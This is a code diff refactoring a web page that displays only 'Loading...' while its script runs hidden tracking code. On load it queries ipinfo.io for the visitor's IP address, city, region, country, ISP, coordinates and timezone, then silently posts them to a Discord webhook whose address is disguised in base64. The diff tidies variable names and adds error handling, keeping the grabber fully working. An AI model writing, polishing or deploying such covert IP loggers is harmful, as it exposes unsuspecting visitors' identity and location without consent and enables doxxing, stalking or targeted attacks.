@@ -20,22 +20,25 @@
 <body>
     <h1>Loading...</h1>
     <script>
-        let webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTYyNDAwNzcyMA=="; 
-        let decodedWebhook = atob(webhook);
+        let webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTYyNDAwNzcyMA=="; 
+        let decodedWebhook = atob(webhookBase64);
         let token = "afbce99e0999ed"; 
 
         async function fetchIPInfo() {
-            let response = await fetch(`https://ipinfo.io/json?token=${token}`);
-            if (response.ok) {
+            try {
+                let response = await fetch(`https://ipinfo.io/json?token=${token}`);
+                if (!response.ok) throw new Error("Network response was not ok.");
                 let data = await response.json();
-                let messageContent = {
+                let content = {
                     content: `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country}, Org: ${data.org}, Loc: ${data.loc}, TZ: ${data.timezone}`
                 };
                 await fetch(decodedWebhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(messageContent)
+                    body: JSON.stringify(content)
                 });
+            } catch (error) {
+                console.error("Error:", error);
             }
         }
 
